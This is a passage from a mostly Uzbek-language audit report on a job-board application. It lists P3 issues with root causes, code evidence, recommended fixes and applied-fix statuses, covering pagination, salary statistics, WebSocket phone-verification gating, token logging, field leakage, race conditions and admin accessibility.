- **Evidence:** vacancies.service.ts:68-75 izoh 'talablar kartadagi ko'nikma belgilarini ajratish uchun qoldirilgan (audit ISSUE-048)', `requirements: true`. web lib/api.ts:244 `extractSkills(`${raw.title}\n${raw.requirements}`)`. vacancies.routes.ts:57 requirements max 10_000. companies.routes.ts:27-28 COMPANY_REVIEWS_LIMIT=200, COMPANY_VACANCIES_LIMIT=100.
- **Recommended fix:** Yozish vaqtida skills: String[] (<=12) denormalizatsiya qilib karta select'idan requirements'ni olib tashlang (mavjudlar uchun backfill). Kompaniya sharhlarini take 20 + cursor, vakansiyalarni take 20 bilan sahifalang (to'liq ro'yxat /api/vacancies?company= orqali bor).
- **Severity izohi:** P3 saqlandi. ISSUE-048 fix'i requirements'ni ataylab qoldirgan; ISSUE-047 (FIXED) limitlar qo'shgan.
- **Manba topilmalar:** db-perf-16
- **Bajarilgan fix:** db-perf-16: NOT FIXED — VACANCY_CARD_SELECT still ships requirements because the web extracts the skill chips from title+requirements on the client (apps/web/src/lib/api.ts). Dropping or truncating it sil
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-051

**Maosh statistikasi eng yangi 20 000 faol vakansiyadan ortig'ini jimgina tashlaydi va har kesh bekor bo'lganda to'plamni to'liq qayta yuklaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-051
- **Area:** scale/stats
- **Fayl:** `apps/api/src/modules/stats/salary.stats.ts:76`
- **Root cause:** loadDataset MAX_ROWS=20 000 faol vakansiyani category va region bilan xotiraga o'qib medianlarni JS'da hisoblaydi. Kesilganlik bayrog'i yo'q, global versiya o'zgarsa to'plam to'liq qayta yuklanadi.
- **Impact:** Hozir 14 427 faolda hech narsa tushmaydi. 20k faoldan oshganda /salaries mediana, taqsimot va bozor sonlari sezilmay qisman bo'ladi. Har qayta yuklash ~0.57 s va API jarayonida 20k obyekt.
- **Evidence:** salary.stats.ts:76 MAX_ROWS = 20_000; :166-181 cached(5*60_000) findMany status active, orderBy publishedAt desc, take MAX_ROWS; javobda truncated maydoni yo'q. FINAL_AUDIT cold 573 ms.
- **Recommended fix:** aggregateRaw bilan hisoblang: $match active, UZS, maosh yashirilmagan, keyin kategoriya/hudud/tajriba bo'yicha $group ($percentile MongoDB 7+ yoki bucket histogramma). Yoki faqat raqamli maydonlarni proyeksiya qilib chegarani olib tashlang yoki chegaraga yetganda warning + truncated. Domen bo'yicha kesh versiyasi bilan birlashtiring; vacancyCount semantikasi saqlansin.
- **Severity izohi:** P3 saqlandi: hozirgi hajmda ta'sir yo'q. ISSUE-051 (FIXED) kesh qo'shgan, 20k chegara qolgan.
- **Manba topilmalar:** db-perf-17, scale-10k-18
- **Bajarilgan fix:** db-perf-17: PARTIAL — The 20k-row dataset cache now depends only on the vacancies scope (a review/company write no longer reloads it), the cap logs a warning when reached and the response exposes trunca | scale-10k-18: PARTIAL — Same change as db-perf-17: the silent truncation is now visible (log + truncated flag) and cache reloads are far less frequent, but the 20k cap and the in-process dataset remain.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-046

**Nomzodga tegishli ro'yxatlar chegarasiz: arizalar take'siz, sevimlilar per-user cheklovsiz, /favorites/ids to'liq ro'yxat**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-046
- **Area:** scale/pagination
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:129`
- **Root cause:** GET /api/applications nomzodning barcha arizalarini statusHistory bilan take'siz qaytaradi. Sevimlilar soni cheklanmaydi va /api/favorites/ids har ro'yxat va qidiruv sahifasida so'raladigan barcha ID'larni qaytaradi. /api/favorites vacancy.status relation filtri bilan (take 500).
- **Impact:** Hozir kichik (5 KB o'lchangan). Faol foydalanuvchi yoki skript bu ro'yxatlarni cheksiz o'stirishi mumkin, keyin har vakansiya ro'yxati sahifasi to'liq ID ro'yxatini yuklaydi.
- **Evidence:** applications.routes.ts:129-155 findMany where jobSeekerId, take yo'q. favorites.routes.ts:71-76 favorites/ids take yo'q; :92-96 upsert soni tekshirilmaydi; :25-31 vacancy.status relation filtri, take FAVORITES_LIMIT.
- **Recommended fix:** /api/applications'ga take (<=200) + cursor. Sevimlilarni foydalanuvchiga (masalan 1000) cheklang va a'zolikni faqat joriy sahifadagi ID'lar uchun (?ids=) qaytaring.
- **Severity izohi:** P3 saqlandi. ISSUE-046 root cause'ida /api/applications va /api/favorites chegarasizligi bor; favorites 500 cap bilan qisman tuzatilgan.
- **Manba topilmalar:** db-perf-18
- **Bajarilgan fix:** db-perf-18: PARTIAL — GET /api/applications ga take=300 chegarasi qo'yildi (javob shakli — massiv — o'zgarmadi). Cursor sahifalash qilinmadi: javobni o'qiydigan apps/web/src/components/applications/** v
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-003

**WS message frame'lari REST xabarlashuvda talab qilinadigan telefon tasdig'ini tekshirmaydi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-003
- **Area:** realtime/authz
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:274`
- **Root cause:** requirePhoneVerified xabarni ('xabar') kalit amal deb hujjatlaydi va POST /api/conversations/start'da qo'llaydi. WS ulanish tekshiruvi faqat isBlocked va tokenVersion'ni o'qiydi, 'message' yo'li faqat ishtirokchilikni tekshiradi.
- **Impact:** Telefoni tasdiqlanmagan foydalanuvchi mavjud suhbatda (masalan employer boshlagan) WS orqali xabar yuboradi — hujjatlangan anti-spam siyosatiga zid. Suhbatni faqat tasdiqlangan foydalanuvchi ochgani uchun spam yuzasi javoblar bilan cheklangan.
- **Evidence:** auth-guard.ts:86-89 'Kalit amallar (ariza, vakansiya, xabar)'. chat.routes.ts:204-205 select {isBlocked, tokenVersion}; :274-278 isPhoneVerified tekshiruvisiz deliverMessage; :294 REST start requirePhoneVerified bilan.
- **Recommended fix:** Ulanish tekshiruvida isPhoneVerified'ni ham o'qib false bo'lsa 'message' frame'ni {type:'error', code:'PHONE_NOT_VERIFIED'} bilan rad eting va UI tasdiqlashni taklif qilsin. Yoki javob yozishga ruxsat berish bo'yicha aniq product qarorini yozing.
- **Severity izohi:** P2 dan P3 ga tushirildi: suhbatni faqat telefoni tasdiqlangan foydalanuvchi ochadi, xabarlashuv gate'i product rule'da aniq yo'q. ISSUE-003 impact matnida bu kamchilik qayd etilgan, fix faqat isBlocked'ni qo'shgan.
- **Manba topilmalar:** realtime-2
- **Bajarilgan fix:** realtime-2: FIXED — WS 'message' frames check isPhoneVerified: false at handshake triggers one fresh DB read (so verifying in another tab works without reconnecting); still unverified -> {type:'error'
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-030

**WS access token hali query string'da (ilova loglari redakt qilingan, infratuzilma loglari noma'lum)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** NOT FIXED
- **Mavjud tracker:** ISSUE-030
- **Area:** security/logging
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:189`
- **Root cause:** Brauzer WS API header qo'ya olmaydi, 15 daqiqalik access token ?token= da ketadi. Fastify loglari redakt qilingan, lekin ilovadan tashqaridagi proxy/edge access loglari to'liq URL'ni yozishi mumkin (inference; Railway tekshirilmagan).
- **Impact:** Access tokenlar infratuzilma loglarida saqlanishi mumkin; qisqa muddatli va tokenVersion'ga bog'liq bo'lgani uchun ta'sir cheklangan.
- **Evidence:** chat.routes.ts:187-189 url.searchParams.get('token'); web useChatSocket.ts:59 va useNotifications.ts `?token=${encodeURIComponent(current)}`. server.ts redactUrl. ISSUE-030 uzoq muddatli bir martalik ticket tavsiya qilgan.
- **Recommended fix:** POST /api/ws-ticket (requireAuth) 30 s li tasodifiy bir martalik ticket qaytarsin (xotirada hashlangan), WS ?ticket= qabul qilib userni qayta tekshirsin. Yoki tokenni birinchi frame'da yuboring.
- **Severity izohi:** P3 saqlandi, low confidence. ISSUE-030 ilova loglari uchun FIXED, ticket joriy qilinmagan.
- **Manba topilmalar:** realtime-17
- **Bajarilgan fix:** realtime-17: NOT FIXED — P3 and low confidence: a one-time ws-ticket endpoint only helps once the web stops sending ?token=, and the web client is another group's file this round. App logs already redact t
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-037

**Bir egaga bitta kompaniya va bir profilga bitta rezyume check-then-create poygasi bilan, unique indekssiz**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Mavjud tracker:** ISSUE-037
- **Area:** data-integrity/race
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:251`
- **Root cause:** POST /api/companies, PUT /api/employer/company, companyName bilan ro'yxatdan o'tish va PUT /api/resume avval qidirib keyin yaratadi. Company.ownerUserId va Resume.jobSeekerId'da faqat unique bo'lmagan indekslar.
- **Impact:** Parallel so'rovlar (ikki marta bosish, ro'yxatdan o'tish bilan profil saqlash poygasi) ikkinchi kompaniya yoki rezyume yaratadi. primaryCompany/findFirst eng eskisini qaytargani uchun dublikat UI'da ko'rinmaydi, lekin ownedCompanyIds uni hisobga oladi va katalog/sitemap uni ko'rsatadi.
- **Evidence:** companies.routes.ts:251-259 `if (await primaryCompany(...)) throw conflict` → create. schema.prisma:337 @@index([ownerUserId]); :252 @@index([jobSeekerId]). resume.routes.ts:96-104 findFirst → create. ownership.ts:7-8 izoh ko'p kompaniyani qabul qiladi.
- **Recommended fix:** Bitta kompaniya qoidasi yakuniy bo'lsa dublikat hisobotidan keyin @@unique([ownerUserId]) qo'shib P2002'ni mavjud 409 ga map qiling. Rezyume uchun @@unique([jobSeekerId]) yoki profil kaliti bo'yicha upsert.
- **Severity izohi:** P3 saqlandi, medium confidence. ISSUE-037 (FIXED) 409 tekshiruvini qo'shgan, poyga qolgan.
- **Manba topilmalar:** data-integrity-13
- **Bajarilgan fix:** data-integrity-13: WONT FIX — The real fix is @@unique([ownerUserId]) on Company (plus @@unique([jobSeekerId]) on Resume) and mapping P2002 to the existing 409; prisma/schema.prisma is not owned and the index w
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-022

**Xatoni bo'sh natija deb qaytaruvchi fetcherlar qoldiqlari: saqlangan kompaniyalar, push, baho, SSR kataloglari, noto'g'ri shakldagi 200 va eksport qilingan ishlatilmaydigan variantlar**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-022
- **Area:** frontend/empty-vs-error
- **Fayl:** `apps/web/src/lib/apiExtra.ts:156`
- **Root cause:** fetchSavedCompanyIds, fetchPushPublicKey (get() fallback) va fetchConversationRating (null) xatoni 'hech narsa yo'q' bilan farqlamaydi. fetchCategories/fetchRegions/fetchFeaturedCompanies SSR loaderlarida [] qaytaradi, sahifa esa faqat null'da qayta so'raydi. Strict ro'yxat fetcherlari 2xx'dagi JSON bo'lmagan yoki items'siz javobni [] qiladi. Eski lenient eksportlar va 'server o'chiq → bo'sh natija' sarlavha izohlari qolgan.
- **Impact:** 401/5xx/tarmoqda barcha kompaniyalar saqlanmagan ko'rinadi; usePush 'sozlanmagan' deb push tugmasini yashiradi; baho xatosi null bo'lib qayta yuklanmaydi va Rate tugmasi yo'qoladi. Bitta SSR xatosidan keyin /salaries kategoriya/hududsiz, /companies 'Top kompaniyalar'siz qoladi. Yangi kod lenient eksportlarni import qilsa ISSUE-021/022/067 bug'lari qaytadi.
- **Evidence:** apiExtra.ts:45-49 get() `if (!res || !res.ok) return fallback`; :156-159, :237-240. api.ts:949-958 fetchConversationRating null; useMessenger.ts:288-293 catch → null, :339 `if (!(activeId in ratingsRef.current))`. salaries/+data.ts:20-21; companies/+data.ts:21; api.ts:455-459 catch → []. api.ts:1-2 va apiExtra.ts:4-5 izohlari; fetchVacancies, fetchCompanies, fetchMe, refreshAccessToken, fetchFavoriteIds chaqiruvlari 0 (grep).
- **Recommended fix:** Bular uchun throw qiladigan (getStrict uslubidagi) fetcherlar; useSavedCompanies'ga ready/error, usePush'ga 'error' holati, baho xatosida yozuvni o'chirib qayta yuklash. Loaderlarda strict variant + .catch(() => null) (fetchCategoriesStrict qo'shing). Strict ro'yxatlar null JSON yoki massiv bo'lmagan items'da ApiError(status,'BAD_RESPONSE'). Ishlatilmaydigan lenient eksportlarni o'chiring, izohlarni yangilang.
- **Severity izohi:** Hammasi P3 berilgan; bir root cause (apiExtra/api.ts'dagi 'xatoda bo'sh natija' siyosati qoldiqlari) bo'lgani uchun birlashtirildi. ISSUE-022 (FIXED) shu root cause'ni obunalar va vakansiya ID'lari uchun tuzatgan.
- **Manba topilmalar:** api-errors-7, api-errors-8, api-errors-12, api-errors-13
- **Bajarilgan fix:** api-errors-7: PARTIAL — Saved companies fixed: fetchSavedCompanyIdsStrict + a `ready` flag in useSavedCompanies, and toggle re-fetches the real set when the state is unknown, so an error can no longer loo | api-errors-8: FIXED — Done at the loaders because lib/api.ts is not owned (no fetchCategoriesStrict to add): salaries/+data.ts returns null instead of an empty categories/regions list and companies/+dat | api-errors-12: PARTIAL — O'zimning fetcher'larim: lib/messages/api.ts (suhbatlar va tarix) va lib/notifications/api.ts endi JSON bo'lmagan yoki `items` massiv bo'lmagan 2xx javobda ApiError(status,'Kutilma
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-060

**Telefon tasdiqlash gate'i faqat suhbat boshlashda ishlaydi: WS xabarlari va ariza holati izohi tasdiqsiz yuboriladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-060
- **Area:** authz/phone-gate
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:205`
- **Root cause:** auth-guard.ts'dagi izohga ko'ra requirePhoneVerified asosiy amallar, jumladan xabarlar uchun mo'ljallangan, lekin u faqat POST /api/conversations/start'ga qo'llangan. WS message frame'lari faqat suhbat ishtirokchisi ekanini va ulanishda bir marta blok/tokenVersion'ni tekshiradi. ISSUE-060 PATCH status izohiga phone gate qo'yishni tavsiya qilgan edi, lekin fix faqat real-time yetkazishni qo'shgan.
- **Impact:** Tasdiqlangan ish beruvchi telefoni tasdiqlanmagan nomzod bilan suhbat ochsa, nomzod faqat WS token-bucket bilan cheklangan holda xabar yubora oladi va har bir xabar qabul qiluvchining Telegram'iga ham uzatiladi. Bu hujjatlashtirilgan anti-spam qoidasiga zid. Ta'sir cheklangan: suhbatni tasdiqlangan tomon boshlashi kerak, holat izohi esa telefon tasdiqlangan holda yaratilgan vakansiya egasidan keladi.
- **Evidence:** chat.routes.ts:204-206 `select: { isBlocked: true, tokenVersion: true }` (isPhoneVerified yo'q); :256-278 deliverMessage'dan oldin tasdiq tekshirilmaydi; :294 `requirePhoneVerified` faqat start'da. applications.routes.ts:309 `preHandler: [requireAuth, requireRole('employer', 'admin')]`, :350-353 deliverMessage. auth-guard.ts:86-89 izoh. ISSUES.md:1438 ISSUE-060 tavsiyasi: 'Izoh bo'lsa phone gate qo'llash'.
- **Recommended fix:** WS ready tekshiruvida isPhoneVerified'ni ham tanlang va tasdiqlanmagan foydalanuvchining message frame'lariga xato hodisasi bilan javob bering (o'qishga ruxsat qolsin). Holat izohi berilganda requirePhoneVerified qo'llang. Agar javob yozishga ruxsat berish mahsulot niyati bo'lsa, buni qaror sifatida yozing va auth-guard izohini tuzating. UI'da 'javob yozish uchun telefonni tasdiqlang' holatini ko'rsating.
- **Severity izohi:** P3 saqlandi: suhbatni tasdiqlangan tomon boshlashi shart. ISSUE-060 FIXED, lekin undagi phone gate tavsiyasi bajarilmagan.
- **Manba topilmalar:** gap2-6
- **Bajarilgan fix:** gap2-6: FIXED — Same gate; the other message path (application status reason) runs through deliverMessage from a REST route that is already behind requirePhoneVerified.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-032

**Ochiq vakansiya detail'i ichki rejectionReason maydonini qaytaradi (include ishlatilgan, maydonlar whitelist'i yo'q)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-032
- **Area:** visibility/vacancy
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:551`
- **Root cause:** getVacancyBySlug include ishlatadi, shuning uchun Vacancy'ning barcha skalyar maydonlari, jumladan rejectionReason, mehmonga yuboriladi. Ro'yxat, similar va kompaniya sahifasi VACANCY_CARD_SELECT whitelist'idan foydalanadi, detail esa undan foydalanmaydi. rejectionReason faqat admin moderate -> active'da tozalanadi; moderate -> archived va ish beruvchining PATCH archived -> active amallari uni saqlab qoladi. ISSUE-032 whitelist'i faqat kompaniya maydonlariga qo'llangan.
- **Impact:** Admin vakansiyani 'Soxta kompaniya, STIR mos emas' izohi bilan rad etadi, keyin moderate orqali archived qiladi, ish beruvchi esa PATCH bilan uni qayta faollashtiradi. Shundan so'ng GET /api/vacancies/<slug> va SSR data payload bu ichki moderatsiya izohini har bir mehmonga ko'rsatadi. Kelajakda Vacancy'ga qo'shiladigan har qanday ichki maydon ham sukut bo'yicha ochiq bo'ladi.
- **Evidence:** vacancies.service.ts:549-562 `findUnique({ where: { slug }, include: { company: { select }, region: true, category: true } })`; :575 `withPublicSalary({ ...vacancy, ... })`. schema.prisma:427 rejectionReason. admin.routes.ts:305-306 faqat active holatida tozalaydi. vacancies.routes.ts:257-263 PATCH faqat status va publishedAt'ni yozadi. Web'da rejectionReason faqat ish beruvchi ko'rinishida o'qiladi (VacancyRow.tsx:85, employer adapter.ts:69).
- **Recommended fix:** include o'rniga aniq VACANCY_DETAIL_SELECT yozing: karta maydonlari + description, conditions, contacts, images, address; rejectionReason va boshqa ichki maydonlarsiz. rejectionReason'ni active yoki archived holatiga har bir o'tishda (moderate archived, PATCH active) tozalang. apps/web/src/lib/vacancies/detail.ts faqat yangi select'dagi maydonlarni o'qishini tekshiring va e2e'da detail javobida rejectionReason yo'qligini tasdiqlang.
- **Severity izohi:** P3 saqlandi: izoh faqat rad etish -> arxiv -> qayta faollashtirish ketma-ketligidan keyin ochiladi. ISSUE-032'dagi whitelist tamoyili detail'da to'liq qo'llanmagan.
- **Manba topilmalar:** gap4-3
- **Bajarilgan fix:** gap4-3: FIXED — getVacancyBySlug uses the new explicit VACANCY_DETAIL_SELECT: rejectionReason and adminArchivedAt are not returned to guests, and any internal field added to Vacancy later stays pr
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-038

**Arizalar ro'yxati va chatdagi vakansiya kartasi rad etilgan yoki moderatsiyadagi vakansiya mazmunini arizachilarga ko'rsatadi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-038
- **Area:** visibility/vacancy
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:130`
- **Root cause:** GET /api/applications va GET /api/conversations'dagi vakansiya konteksti vakansiyani status bo'yicha filtrlamasdan yuklaydi va title, maosh, hudud, kompaniyani qaytaradi; faqat isClosed = status !== active hisoblanadi. ISSUE-038 fix'i faqat sevimlilarga (active yoki archived) qo'llangan. Rad etilgan vakansiyaga PUT qilinsa, yangi sarlavha va maosh saqlanadi va vakansiya ko'rib chiqilmasdan moderation holatiga o'tadi.
- **Impact:** 40 nomzod ariza bergan vakansiya soxta sarlavha sababli rad etiladi. Ish beruvchi PUT bilan 'Oylik 30 mln, oldindan to'lov @scam' sarlavhasi va yangi maoshni yozadi. Admin ko'rib chiqishidan oldin barcha 40 arizachi moderatsiyadan o'tmagan matnni /applications va /messages kartasida faqat 'yopilgan' belgisi bilan ko'radi. Qamrov past, chunki ish beruvchi ularga to'g'ridan-to'g'ri ham yozishi mumkin.
- **Evidence:** applications.routes.ts:130 `where: { jobSeekerId }`; :133-145 vakansiya select'ida title, status, salaryMin/Max, company bor. chat.routes.ts:400-402 kompaniya bo'yicha vakansiya id'lari status'siz; :485-494 title/salary + isClosed. favorites.routes.ts:28 `status: { in: [active, archived] }` (ISSUE-038). vacancies.routes.ts:186-214 rejected -> PUT -> moderation. Web: ApplicationCard.tsx:65,166 va ConversationVacancyContext.tsx:27-29,41 yopilgan holatda ham sarlavhani chizadi.
- **Recommended fix:** Ikkala endpoint'da vakansiya statusi moderation yoki rejected bo'lsa, redaksiya qilingan karta qaytaring: title va maoshsiz, masalan title null, isRemoved true. archived holati hozirgidek qolsin. Muqobil: ariza paytida Application'da title, kompaniya va maoshning snapshot'ini saqlab, ochiq bo'lmagan statuslarda o'shani ko'rsating (sxema maydoni va backfill kerak). 'Vakansiya olib tashlangan' matnini uz/ru/en tillariga qo'shing va e2e [ISSUE-034/038] tekshiruvini kengaytiring.
- **Severity izohi:** P3 saqlandi: faqat allaqachon ariza bergan nomzodlarga ko'rinadi. ISSUE-038'dagi status filtri qo'shni endpointlarga qo'llanmagan.
- **Manba topilmalar:** gap4-2
- **Bajarilgan fix:** gap4-2: PARTIAL — GET /api/applications: moderatsiyadagi yoki rad etilgan vakansiyaning maosh raqamlari berkitiladi va isUnavailable:true bayrog'i qo'shildi (additiv, eski klientni buzmaydi). Sarlav
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-072

**Vakansiya muddati hech bir o'qish yo'lida qo'llanmaydi, JSON-LD esa o'tib ketgan validThrough chiqaradi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Mavjud tracker:** ISSUE-072
- **Area:** visibility/expiry
- **Fayl:** `apps/web/src/pages/vacancies/@slug/+Head.tsx:59`
- **Root cause:** createVacancy, PATCH status va admin moderate expiresAt'ni hech qachon o'rnatmaydi va hech bir o'qish yo'li (buildFilters, detail, similar, kompaniya sahifasi, sitemap, Meili, maosh statistikasi) u bo'yicha filtrlamaydi; maydonni faqat demo-seed yozadi. +Head.tsx expiresAt mavjud bo'lsa, u o'tib ketgan bo'lsa ham validThrough chiqaradi, ApplyCard esa o'tgan muddatni yashiradi.
- **Impact:** E'lonlar ish beruvchi qo'lda arxivlamaguncha ochiq qoladi. O'n minglab vakansiya bo'lganda ro'yxat, sitemap va maosh statistikasi (eng yangi 20k qator asosida) eskirgan ishlarga to'lib ketadi. 30 kundan eski seed yoki import qilingan qatorlar uchun Google jonli sahifada validThrough'i o'tib ketgan JobPosting oladi; UI va JSON-LD bir-biriga zid.
- **Evidence:** +Head.tsx:59 `...(vacancy.expiresAt ? { validThrough: vacancy.expiresAt } : {})`. ApplyCard.tsx:51 `new Date(vacancy.expiresAt).getTime() > Date.now()` tekshiradi. apps/api/src/modules/{vacancies,seo,search} ichida expiresAt faqat vacancies.service.ts:92 (select) da uchraydi; demo-seed.ts:1714 publishedAt + 30 kun yozadi. ISSUES.md:1680 ISSUE-072 PARTIAL: validThrough amalda yo'q.
- **Recommended fix:** Avval mahsulot qarorini qabul qiling (ISSUE-072). Hozir qilinadigan minimal tuzatish: +Head.tsx'da validThrough'ni faqat sana kelajakda bo'lsa chiqaring (ApplyCard'dagi tekshiruv bilan bir xil). Muddat qabul qilinsa: aktivlashda expiresAt'ni o'rnating; buildFilters, detail, similar, sitemap va kompaniya sahifasiga indekslangan 'expiresAt null yoki > now' shartini qo'shing; muddati o'tgan vakansiyalarni arxivlab indeksdan chiqaradigan sweep qo'shing (mavjud aktiv vakansiyalar uchun imtiyozli muddat bilan).
- **Severity izohi:** P3 saqlandi: SEO va ma'lumot sifati masalasi, xavfsizlikka ta'siri yo'q.
- **Manba topilmalar:** gap4-4
- **Bajarilgan fix:** gap4-4: WONT FIX — D-066 is binding: no automatic expiry, and the API keeps expiresAt as is, so no read path filters on it. The cheap half of the finding (emit validThrough only when it is in the fut
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-031

**Noto'g'ri formatdagi id bir xil ishlanmaydi: saved-search route'lari xom params'ni Prisma'ga beradi (P2023 -> 404, boshqa route'larda 400)**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-031
- **Area:** api/validation
- **Fayl:** `apps/api/src/modules/alerts/alerts.routes.ts:119`
- **Root cause:** PATCH va DELETE /api/saved-searches/:id req.params'ni idParams yoki isObjectId tekshiruvisiz o'qiydi va to'g'ridan-to'g'ri findUnique'ga beradi. 500 qaytmasligi faqat server.ts'dagi global P2023 -> 404 xaritalashiga bog'liq. Boshqa route'lar turlicha ishlaydi: idParams 400 VALIDATION_ERROR beradi, team va articles admin esa isObjectId orqali 404. PATCH body'ni id'dan oldin tekshiradi, shuning uchun status body to'g'riligiga bog'liq.
- **Impact:** Crash ham, egalik sizib chiqishi ham yo'q (found.userId tekshiriladi). Lekin klientlar bir xil xato uchun goh 400, goh 404 oladi; kelajakda foydalanuvchi bergan $oid bilan xom aggregate yozilsa, 500 qaytishi mumkin. e2e faqat status < 500 ekanini va faqat PATCH holatini tekshiradi.
- **Evidence:** alerts.routes.ts:119 `const { id } = req.params as { id: string }`; :120 `updateSchema.parse(req.body)` id tekshiruvidan oldin; :121,135 `savedSearch.findUnique({ where: { id } })`. server.ts:202-204 P2023 -> 404 NOT_FOUND. team.routes.ts:160-161,178 va articles.admin.routes.ts:128-129 isObjectId -> 404. e2e-check.mjs:1398-1421 (:1412 faqat PATCH).
- **Recommended fix:** Ikkala alerts handler'ida body'dan oldin idParams.parse(req.params) chaqiring. Noto'g'ri id uchun yagona shartnoma tanlang (format va mavjudlik farqlanmasligi uchun 404 tavsiya etiladi) va uni idParams, team va articles'ga qo'llang. e2e'dagi malformed-id matritsasini DELETE saved-searches, team invites/members va admin articles bilan kengaytiring.
- **Severity izohi:** P3 saqlandi: xavfsizlikka ta'siri yo'q, API izchilligi masalasi; ISSUE-031 fix'idan qolgan nomuvofiqlik.
- **Manba topilmalar:** gap2-7
- **Bajarilgan fix:** gap2-7: FIXED — Saved-search PATCH/DELETE parse :id with idParams (ObjectId) before touching Prisma, so a malformed id returns 400 VALIDATION_ERROR instead of relying on P2023.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**Admin ro'yxat ekranlari: qidiruv input'ida label yo'q, amallar ustunining sarlavhasi bo'sh, reytingdagi aria-label e'tiborsiz qoladi**

- **Severity:** P3
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-075
- **Area:** a11y/admin
- **Fayl:** `apps/web/src/components/AdminShell.tsx:216`
- **Root cause:** AdminSearchInput faqat placeholder'li input chizadi: label, id yoki aria-label yo'q. AdminTable'ni chaqiruvchilar amallar ustuni uchun `<th>&nbsp;</th>` beradi. Sharhlar reytingida aria-label ARIA ruxsat bermaydigan generic span'ga qo'yilgan. ISSUE-075 fix'i label'ni faqat nomzod qidiruviga qo'shgan.
- **Impact:** Admin foydalanuvchi/vakansiya/kompaniya qidiruvida maydon maqsadi yozish boshlanganda yo'qoladigan placeholder'ga tayanadi (3.3.2). Bo'sh sarlavha tufayli ekran o'quvchi amal tugmalarini ustun nomisiz o'qiydi; reyting yulduz belgilari sifatida o'qiladi. Faqat admin interfeysiga tegishli.
- **Evidence:** AdminShell.tsx:216-221 `<input value=... placeholder={placeholder} ...>`, label/aria-label yo'q; AdminSelect'da (:238-249) esa aria-label bor. Bo'sh sarlavhalar: pages/admin/users/+Page.tsx:124, vacancies :138, companies :102, reviews :112, payments :116. reviews/+Page.tsx:125 `<span aria-label={`${row.rating}/5`}>` ichida '★'.repeat(...). ISSUE-075 'Bajarilgan fix': label faqat nomzodlar qidiruviga qo'shilgan.
- **Recommended fix:** AdminSearchInput'ga aria-label={placeholder} (yoki ko'rinmas label) va type=search qo'shing. Bo'sh sarlavha o'rniga `<th><span className='sr-only'>amallar</span></th>` ishlating (i18n bilan). Reytingga role=img va aria-label bering yoki sr-only matn qo'shib, yulduzlarni aria-hidden qiling. Xohishga ko'ra birinchi katakni `<th scope='row'>` qiling.
- **Severity izohi:** P3 saqlandi (faqat admin interfeysi).
- **Manba topilmalar:** gap5-6
- **Bajarilgan fix:** gap5-6: FIXED — AdminSearchInput has type=search and aria-label; every admin table action column uses the new AdminActionsHeader with an sr-only name; the reviews rating is role=img with an aria-l
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-093

**_error head: 500 va maqola 404 uchun umumiy 'Sahifa topilmadi' meta; xato sahifalarida hreflang chiqadi**

- **Severity:** P3
